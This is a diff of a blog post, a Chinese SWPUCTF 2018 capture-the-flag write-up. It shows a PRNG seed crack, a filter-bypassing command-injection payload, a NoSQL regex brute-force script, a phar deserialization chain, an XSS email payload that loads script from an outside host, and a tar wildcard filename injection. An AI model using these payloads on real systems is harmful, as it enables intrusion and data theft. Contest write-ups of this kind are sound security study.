@@ -113,72 +113,164 @@
                 <p>恰逢复习期，也没什么事，打一场SWPUCTF来放松一下，感谢西油出题师傅。最后狗了个第十二名，顺便吐槽一下队友起的什么智障名字。。<br><img src="https://i.loli.net/2018/12/20/5c1b02a394512.png" alt></p>
 <h1 id="SWPUCTF2018"><a href="#SWPUCTF2018" class="headerlink" title="SWPUCTF2018"></a>SWPUCTF2018</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="PCAP"><a href="#PCAP" class="headerlink" title="PCAP"></a>PCAP</h2><p>签到题，流量包拖wireshark追TCP包</p>
 <h2 id="床前明月光-低头…"><a href="#床前明月光-低头…" class="headerlink" title="床前明月光,低头…"></a>床前明月光,低头…</h2><p>低头看键盘</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33</span><br></pre></td></tr></table></figure>
-
-<p>键盘密码 99就代表9那列的第二个值</p>
+<pre><code>99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33</code></pre><p>键盘密码 99就代表9那列的第二个值</p>
 <p>look ….. 依次读就行了</p>
 <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="用优惠码买个X"><a href="#用优惠码买个X" class="headerlink" title="用优惠码买个X"></a>用优惠码买个X</h2><p>拿到题目扫目录 <a href="http://www.zip" target="_blank" rel="noopener">www.zip</a><br>源码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;seed&apos;]=rand(0,999999999);</span><br><span class="line">function youhuima()&#123;</span><br><span class="line">	mt_srand($_SESSION[&apos;seed&apos;]);</span><br><span class="line">    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">    $auth=&apos;&apos;;</span><br><span class="line">    $len=15;</span><br><span class="line">    for ( $i = 0; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        if($i&lt;=($len/2))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);</span><br><span class="line">        else</span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(&apos;Auth&apos;, $auth);</span><br><span class="line">&#125;</span><br><span class="line">//support</span><br><span class="line">	if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip))&#123;</span><br><span class="line">        if (!preg_match(&quot;/\?|flag|&#125;|cat|echo|\*/i&quot;,$ip))&#123;</span><br><span class="line">               //执行命令</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">              //flag字段和某些字符被过滤!</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">             // 你的输入不正确!</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>根据提示应该分两部分  绕过优惠码-&gt;命令执行逃过</p>
+<pre><code>$_SESSION[&#39;seed&#39;]=rand(0,999999999);
+function youhuima(){
+    mt_srand($_SESSION[&#39;seed&#39;]);
+    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+    $auth=&#39;&#39;;
+    $len=15;
+    for ( $i = 0; $i &lt; $len; $i++ ){
+        if($i&lt;=($len/2))
+              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);
+        else
+              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);
+    }
+    setcookie(&#39;Auth&#39;, $auth);
+}
+//support
+    if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)){
+        if (!preg_match(&quot;/\?|flag|}|cat|echo|\*/i&quot;,$ip)){
+               //执行命令
+        }else {
+              //flag字段和某些字符被过滤!
+        }
+    }else{
+             // 你的输入不正确!
+    }
+?&gt;</code></pre><p>根据提示应该分两部分  绕过优惠码-&gt;命令执行逃过</p>
 <p>首先说破解优惠码，登陆时session产生0-99999999随机数为种子，通过mt_srand()种下随机数种子，mt_rand()来获取这个随机数。</p>
 <p>这里mt_srand伪随机，具体机制可以看这篇文章：<a href="http://wonderkun.cc/index.html/?p=585%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%89%8D%E4%B9%9F%E6%98%AFctf%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=585%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%89%8D%E4%B9%9F%E6%98%AFctf%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF</a></p>
 <p>种子不变，生成的随机数就不变</p>
 <p>所以通过前15位随机数，破解种子，根据种子再生成24位的随机数，也就是我们的优惠码</p>
 <p>脚本跑随机数在字符串的位置：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = &quot;lP9DUJjQ&quot;;</span><br><span class="line">$randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line"> </span><br><span class="line">for($i=0;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">   $pos = strpos($randStr,$str[$i]);</span><br><span class="line">   echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;</span><br><span class="line">   //整理成方便 php_mt_seed 测试的格式</span><br><span class="line">  //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php
+$str = &quot;lP9DUJjQ&quot;;
+$randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
 
-<p>这个的坑点，必须跑前八位优惠码，因为算法里后起位和前八位生成顺序不一样</p>
+for($i=0;$i&lt;strlen($str);$i++){
+   $pos = strpos($randStr,$str[$i]);
+   echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;
+   //整理成方便 php_mt_seed 测试的格式
+  //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]
+}
+echo &quot;\n&quot;;
+?&gt;</code></pre><p>这个的坑点，必须跑前八位优惠码，因为算法里后起位和前八位生成顺序不一样</p>
 <p>用工具php_mt_seed跑一下<br><img src="https://i.loli.net/2018/12/20/5c1af5f2cb05b.png" alt></p>
 <p>本地php7环境跑这个种子的24位就能得到优惠码了</p>
 <p>优惠码成功跳转到命令执行whois查询，匹配ip时用了/m  且^ $必须匹配头尾，%0a换行绕过检测，0a后面写规范ip</p>
 <p>过滤了查询flag的语句，用”” 或者\绕过都行</p>
 <p>完整payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\t /f\lag%0a127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h2 id="Injection"><a href="#Injection" class="headerlink" title="Injection ???"></a>Injection ???</h2><p>扫目录用个info.php</p>
+<pre><code>ca\t /f\lag%0a127.0.0.1</code></pre><h2 id="Injection"><a href="#Injection" class="headerlink" title="Injection ???"></a>Injection ???</h2><p>扫目录用个info.php</p>
 <p>是个phpinfo然后拓展显示mongo的数据库，搭配题目叫注入，那应该是一个nosql注入了</p>
 <p>思路很简单，用通配符猜解admin的密码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password[$regex]=^**</span><br></pre></td></tr></table></figure>
+<pre><code>username=admin&amp;password[$regex]=^**</code></pre><p>只不过要写个脚本跑验证码，这里队友写了一个提供参考</p>
+<pre><code>import requests
+import time
+import pytesseract
+from PIL import Image
+import os
+from urllib.request import urlretrieve
 
-<p>只不过要写个脚本跑验证码，这里队友写了一个提供参考</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import pytesseract</span><br><span class="line">from PIL import Image</span><br><span class="line">import os</span><br><span class="line">from urllib.request import urlretrieve</span><br><span class="line"></span><br><span class="line">j=0</span><br><span class="line">passw0rd = [&quot;s&quot;,&quot;k&quot;,&quot;m&quot;,&quot;u&quot;,&quot;n&quot;]</span><br><span class="line">payload=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_!@#$%&quot;</span><br><span class="line">url = &quot;http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^skmun&#123;&#125;&amp;vertify=&#123;&#125;&quot;</span><br><span class="line">img_url = &apos;http://123.206.213.66:45678/vertify.php&apos;</span><br><span class="line"></span><br><span class="line">for i in range(1,20):</span><br><span class="line">	while j&lt;len(payload):</span><br><span class="line">		s = requests.session()</span><br><span class="line">		payloads = payload[j]</span><br><span class="line">		with open(r&apos;C:\Users\asus\Desktop\image\img1.png&apos;,&apos;wb&apos;) as fd:</span><br><span class="line">			img_1 = s.get(url=img_url)</span><br><span class="line">			fd.write(img_1.content)</span><br><span class="line">		image = Image.open(r&apos;C:\Users\asus\Desktop\image\img1.png&apos;)</span><br><span class="line">		vcode = pytesseract.image_to_string(image)</span><br><span class="line">		url_1 = url.format(str(payloads),vcode)</span><br><span class="line">		r = s.get(url_1,cookies=img_1.cookies)</span><br><span class="line">		print(r.text)</span><br><span class="line">		if &quot;wrong CAPTCHA!&quot; in r.text:</span><br><span class="line">			continue</span><br><span class="line">		if &quot;username or password incorrect!&quot; in r.text:</span><br><span class="line">			print(payloads)</span><br><span class="line">			j = j+1</span><br><span class="line">			break</span><br><span class="line">		if &quot;Nice!But it is not the real passwd&quot; in r.text:</span><br><span class="line">			passw0rd.append(payloads)</span><br><span class="line">			print(&quot;passw0rd is :&quot; + str(passw0rd))</span><br><span class="line">			j = j+1</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
+j=0
+passw0rd = [&quot;s&quot;,&quot;k&quot;,&quot;m&quot;,&quot;u&quot;,&quot;n&quot;]
+payload=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_!@#$%&quot;
+url = &quot;http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^skmun{}&amp;vertify={}&quot;
+img_url = &#39;http://123.206.213.66:45678/vertify.php&#39;
 
-<h2 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h2><p>题目地址：</p>
+for i in range(1,20):
+    while j&lt;len(payload):
+        s = requests.session()
+        payloads = payload[j]
+        with open(r&#39;C:\Users\asus\Desktop\image\img1.png&#39;,&#39;wb&#39;) as fd:
+            img_1 = s.get(url=img_url)
+            fd.write(img_1.content)
+        image = Image.open(r&#39;C:\Users\asus\Desktop\image\img1.png&#39;)
+        vcode = pytesseract.image_to_string(image)
+        url_1 = url.format(str(payloads),vcode)
+        r = s.get(url_1,cookies=img_1.cookies)
+        print(r.text)
+        if &quot;wrong CAPTCHA!&quot; in r.text:
+            continue
+        if &quot;username or password incorrect!&quot; in r.text:
+            print(payloads)
+            j = j+1
+            break
+        if &quot;Nice!But it is not the real passwd&quot; in r.text:
+            passw0rd.append(payloads)
+            print(&quot;passw0rd is :&quot; + str(passw0rd))
+            j = j+1
+            break</code></pre><h2 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h2><p>题目地址：</p>
 <p>file有个代码高亮的功能，把这些页面的额源码都Down一下</p>
 <p>先看一下test类的__get()方法<br><img src="https://i.loli.net/2019/01/17/5c4024d7a5bbf.png" alt><br><img src="https://i.loli.net/2019/01/17/5c4024d7a663a.png" alt></p>
 <p>__get()方法用于输出一个不可访问变量的值，<strong>不可访问不仅仅是protected和private，还有不存在的变量也属于不可访问，这点很重要</strong>。$key的值就是不可访问的参数名，这里是”source”，如果输入”xx”，echo的就是xx。</p>
 <p>开发角度来讲，私有属性一般都会调用__get()方法用以提供外界访问。继续看下面的代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public function get($key)</span><br><span class="line">&#123;</span><br><span class="line">    if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">        $value = $this-&gt;params[$key];      </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $value = &quot;index.php&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return $this-&gt;file_get($value);  </span><br><span class="line">&#125;</span><br><span class="line">public function file_get($value)</span><br><span class="line">&#123;</span><br><span class="line">    $text = base64_encode(file_get_contents($value));</span><br><span class="line">    return $text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过调用get()方法获取params数组里的值，进而获取这个值所对应的文件内容，这为获取flag文件内容做了铺垫。</p>
+<pre><code>    public function get($key)
+    {
+        if(isset($this-&gt;params[$key])) {
+            $value = $this-&gt;params[$key];      
+        } else {
+            $value = &quot;index.php&quot;;
+        }
+        return $this-&gt;file_get($value);  
+    }
+    public function file_get($value)
+    {
+        $text = base64_encode(file_get_contents($value));
+        return $text;
+    }</code></pre><p>通过调用get()方法获取params数组里的值，进而获取这个值所对应的文件内容，这为获取flag文件内容做了铺垫。</p>
 <p>所以只需要想办法使$this-&gt;params[$key] =  ‘/var/www/html/f1ag.php’</p>
 <h3 id="瓶颈"><a href="#瓶颈" class="headerlink" title="瓶颈"></a>瓶颈</h3><p>一开始我是这样构造的攻击链：<br><img src="https://i.loli.net/2018/12/20/5c1b0f967a20a.png" alt></p>
 <p>之前分析过phar，它在反序列化的时候不会执行构造函数即construct，所以置空参数，让test类的get方法返回文件内容，再通过c1e4r类的echo输出到页面上</p>
 <p>但是这里有一个问题，phar序列化的时候， 不会把类的方法反序列化，所以只能控类的成员。那么就开始下面的方法：</p>
-<h3 id="正确的思路"><a href="#正确的思路" class="headerlink" title="正确的思路"></a>正确的思路</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$a = new Test();</span><br><span class="line">$a-&gt;params = [</span><br><span class="line">    &apos;source&apos; =&gt; &apos;/var/www/html/f1ag.php&apos;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$b = new Show();</span><br><span class="line">$b-&gt;str[&apos;str&apos;] = $a;</span><br><span class="line"></span><br><span class="line">$c = new C1e4r();</span><br><span class="line">$c-&gt;str = $b;</span><br></pre></td></tr></table></figure>
+<h3 id="正确的思路"><a href="#正确的思路" class="headerlink" title="正确的思路"></a>正确的思路</h3><pre><code>$a = new Test();
+$a-&gt;params = [
+    &#39;source&#39; =&gt; &#39;/var/www/html/f1ag.php&#39;
+];
 
-<p>思路就是：<br>我们用test类来获取f1ag.php里的内容，返回给$content(Show类)，$content的值再返回给C1e4r类的echo输出</p>
+$b = new Show();
+$b-&gt;str[&#39;str&#39;] = $a;
+
+$c = new C1e4r();
+$c-&gt;str = $b;</code></pre><p>思路就是：<br>我们用test类来获取f1ag.php里的内容，返回给$content(Show类)，$content的值再返回给C1e4r类的echo输出</p>
 <p>C1e4r调用echo，而echo可以执行toString方法，所以我们让echo的值为我们要控的toString方法对应的类即show类的对象</p>
 <h2 id="有趣的邮箱注册"><a href="#有趣的邮箱注册" class="headerlink" title="有趣的邮箱注册"></a>有趣的邮箱注册</h2><p>网站功能很少：提交邮箱地址-&gt;管理审核邮箱</p>
 <p>给了hint:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--check.php</span><br><span class="line">if($_POST[&apos;email&apos;]) &#123;</span><br><span class="line">$email = $_POST[&apos;email&apos;];</span><br><span class="line">if(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">echo &quot;error email, pleduase check your email&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;等待管理员自动审核&quot;;edit/5c1a5a3a38649f668227c9fd</span><br><span class="line">echo $email;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
-
-<p>之前有个红日审计项目，关于filter_var()匹配email的漏洞进行了剖析:<a href="https://xz.aliyun.com/t/2501" target="_blank" rel="noopener">https://xz.aliyun.com/t/2501</a></p>
+<pre><code>&lt;!--check.php
+if($_POST[&#39;email&#39;]) {
+$email = $_POST[&#39;email&#39;];
+if(!filter_var($email,FILTER_VALIDATE_EMAIL)){
+echo &quot;error email, pleduase check your email&quot;;
+}else{
+echo &quot;等待管理员自动审核&quot;;edit/5c1a5a3a38649f668227c9fd
+echo $email;
+}
+}
+?&gt;
+--&gt;</code></pre><p>之前有个红日审计项目，关于filter_var()匹配email的漏洞进行了剖析:<a href="https://xz.aliyun.com/t/2501" target="_blank" rel="noopener">https://xz.aliyun.com/t/2501</a></p>
 <p>大致就是单引号双引号重叠，用\可以绕过空格，</p>
 <p>然后我尝试了一下注入scirpt标签提交..尼玛直接成功了…<br><img src="https://i.loli.net/2018/12/20/5c1af8b853c84.jpg" alt></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=&quot;\ &lt;sCRiPt\ sRC=https://unazizi.exeye.io/swctf&gt;&lt;/sCrIpT&gt;\ &quot;@aa.com</span><br></pre></td></tr></table></figure>
-
-<p>那它的意思应该是后台管理员会随时点击这个email，就触发了xss</p>
+<pre><code>email=&quot;\ &lt;sCRiPt\ sRC=https://unazizi.exeye.io/swctf&gt;&lt;/sCrIpT&gt;\ &quot;@aa.com</code></pre><p>那它的意思应该是后台管理员会随时点击这个email，就触发了xss</p>
 <p>因为打不到管理员的cookie，就打admin.php的页面源码了<br><img src="https://i.loli.net/2018/12/20/5c1af977078cf.jpg" alt></p>
 <p>发现后台会跳到：<code>/admin/a0a.php?cmd=whoami</code></p>
 <p>明显RCE，直接请求到这个url，发现出题人设置了本地，且匹配IP用的是 remote_addr，也就是说无法伪装IP</p>
 <p>后台Bot一直会请求admin.php这个页面，xss 改变它请求的参数，让本地管理员帮我们执行这个命令</p>
 <p>用XHR发送请求或者Location重定向都可以</p>
 <p>反弹Shell后发现还有题目，后台有个上传页面和备份页面，其中backup.php可读内容如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpinclude(&quot;upload.php&quot;);</span><br><span class="line">echo &quot;上传目录：&quot; . $upload_dir . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">$sys = &quot;tar -czf z.tar.gz *&quot;;</span><br><span class="line">chdir($upload_dir);</span><br><span class="line">system($sys);</span><br><span class="line">if(file_exists(&apos;z.tar.gz&apos;))&#123;</span><br><span class="line">        echo &quot;上传目录下的所有文件备份成功!&lt;br /&gt;&quot;;</span><br><span class="line">        echo &quot;备份文件名: z.tar.gz&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        echo &quot;未上传文件，无法备份！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>也就是说它会备份我们上传目录下的所有文件，即*</p>
+<pre><code>&lt;?phpinclude(&quot;upload.php&quot;);
+echo &quot;上传目录：&quot; . $upload_dir . &quot;&lt;br /&gt;&quot;;
+$sys = &quot;tar -czf z.tar.gz *&quot;;
+chdir($upload_dir);
+system($sys);
+if(file_exists(&#39;z.tar.gz&#39;)){
+        echo &quot;上传目录下的所有文件备份成功!&lt;br /&gt;&quot;;
+        echo &quot;备份文件名: z.tar.gz&quot;;
+}else{
+        echo &quot;未上传文件，无法备份！&quot;;
+}
+?&gt;</code></pre><p>也就是说它会备份我们上传目录下的所有文件，即*</p>
 <p>上传一些文件名例如<code>| echo &quot;123&quot;&gt;123.php</code></p>
 <p>System 就会执行拼接后的$sys</p>
 <p>当时题目坏了，出题师傅跟我说直接再弹一个shell，就可以拿到flag权限。。</p>
@@ -190,16 +282,16 @@
            
             <div class="copyright">
                 <div class="name">
-                    <a>本文作者:</a>
+                    <a>Author:</a>
                     <a>Sōsuke</a>
                 </div>
                 <div class="link">
-                    <a>本文链接:</a>
+                    <a>Link:</a>
                     <a class="permalink" href="https://hpdoger.cn/2018/12/20/SWPUCTF2018 Write up/">https://hpdoger.cn/2018/12/20/SWPUCTF2018 Write up/</a>
                 </div>
                 <div class="license">
-                    <a>版权声明:</a>
-                    <a>本博客所有文章除特别声明外，均采用许可协议 CC BY-NC-SA 3.0 CN。转载请注明出处！</a>
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
                 </div>
             </div>
             
@@ -212,7 +304,7 @@
 
 <div class="tip">
 <button class="tip-btn">
-    打赏
+    Tip
 </button>
 <div class="tip-img">
 <ul>
